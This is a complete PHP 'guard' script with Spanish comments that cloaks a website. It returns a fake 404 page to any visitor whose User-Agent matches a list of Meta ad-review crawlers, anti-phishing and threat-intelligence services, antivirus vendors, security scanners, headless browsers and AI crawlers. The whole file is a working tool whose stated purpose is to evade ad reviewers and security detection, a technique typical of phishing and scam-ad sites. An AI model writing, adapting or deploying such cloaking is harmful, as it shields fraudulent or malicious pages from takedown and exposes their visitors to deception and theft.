<?php
/* ═══════════════════════════════════════════════════════════════
   _guard.php — Cloaking ligero, enfocado a revisores de Meta/AV
   Solo bloquea bots por User-Agent. NO bloquea IPs.
   ═══════════════════════════════════════════════════════════════ */
(function () {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $block = function () {
        http_response_code(404);
        if (file_exists(__DIR__ . '/blocked.html')) readfile(__DIR__ . '/blocked.html');
        else echo '<h1>404 Not Found</h1>';
        exit;
    };

    // UA vacío → bot mal hecho
    if ($ua === '') $block();

    // Lista de UAs a bloquear (Meta + AV + headless + scrapers comunes)
    $bl = '/('
        // Crawlers de redes sociales que validan anuncios
        . 'facebookexternalhit|facebot|facebookbot|meta-externalagent|metabot|'
        // Buscadores
        . 'googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|applebot|msnbot|'
        // AVs y threat-intel
        . 'phishtank|netcraft|urlscan|virustotal|safebrowsing|trendmicro|paloalto|fortinet|'
        . 'symantec|mcafee|sophos|eset|kaspersky|bitdefender|avast|f-secure|webroot|'
        . 'malwarebytes|talos|zscaler|forcepoint|barracuda|proofpoint|mimecast|sucuri|'
        // Scanners
        . 'nessus|acunetix|nikto|nmap|sqlmap|openvas|burp|nuclei|wpscan|qualys|'
        // Headless
        . 'headlesschrome|phantomjs|puppeteer|playwright|selenium|webdriver|'
        // SEO / AI scrapers
        . 'ahrefsbot|semrushbot|mj12bot|dotbot|gptbot|chatgpt-user|ccbot|anthropic-ai|claude-web|perplexitybot|'
        // Libs HTTP típicas de bots
        . 'curl\/|wget|python-requests|python-urllib|go-http-client|libwww|scrapy|okhttp'
        . ')/i';

    if (preg_match($bl, $ua)) $block();
})();
